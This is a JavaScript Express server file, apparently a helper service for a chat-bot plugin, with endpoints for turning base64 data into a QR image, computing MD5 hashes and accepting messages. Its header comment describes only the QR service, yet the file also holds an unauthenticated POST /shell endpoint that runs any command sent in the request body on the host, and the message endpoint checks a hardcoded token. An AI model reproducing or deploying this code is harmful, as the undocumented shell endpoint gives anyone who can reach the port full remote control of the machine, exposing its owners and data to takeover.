/*
作者:https://t.me/sillyGirl_Plugin
本服务(get)：ip:port/qr-code?base64={base64 data},返回图片
*/
const express = require('express');
const fs = require('fs');
const md5 = require('md5')
const { exec } = require('child_process');
const app = express();
const port = 3000;	//服务端口

app.use(express.json());

app.get('/qr-code', (req, res) => {
  if(!req.query.base64){
	  res.status(400).send({ message: "this no data in the params" });
	  return
  }
  const base64Data = req.query.base64.replace(/ /g,"+")
  console.log(base64Data)
  fs.writeFile("qr.jpg", base64Data, 'base64', function (err) {
    if (err) {
      res.status(500).send({ message: "Error saving image" });
    }
    else{
      res.sendFile(__dirname + "/qr.jpg");
	}
  });
});

app.post('/shell',(req, res)=>{
	const command=req.body.command
	console.log(command)
    if (command.startsWith('cd ')) {
        const newDir = command.substring(3).trim();
        process.chdir(newDir); // 更改当前工作目录
        res.writeHead(200, { 'Content-Type': 'application/json' });
        res.end(JSON.stringify({ output: `Changed directory to: ${newDir}` }));
    } else {
        exec(command, (error, stdout, stderr) => {
          if (error) {
            res.writeHead(500, { 'Content-Type': 'application/json' });
            res.end(JSON.stringify({ error: error.message }));
          } else {
            res.writeHead(200, { 'Content-Type': 'application/json' });
            res.end(JSON.stringify({ output: stdout ,error: stderr }));
          }
        });
    }
})

app.post('/md5',(req, res)=>{
	const text=req.body.text
	if(typeof(text) == "string")
		res.send(md5(text));
	else
		res.status(400).send({ message: "body must be string" }); 
})

// 定义message接口
app.post('/message', (req, res) => {
	console.log(req.query)
  // 获取token参数
  const token = req.query.token;

  // 验证token是否有效
  if (token !== 'leven') {
    return res.status(401).json({ error: 'Invalid token' });
  }

  // 从请求参数中获取其他参数
  const subject = req.query.subject;
  const content = req.query.content;

  // 处理消息内容，例如发送到其他系统等等
  // ...

  // 返回响应结果
  return res.json({ message: 'Message sent successfully' });
});

app.listen(port, () => {
  console.log(`Server listening at http://localhost:${port}`);
});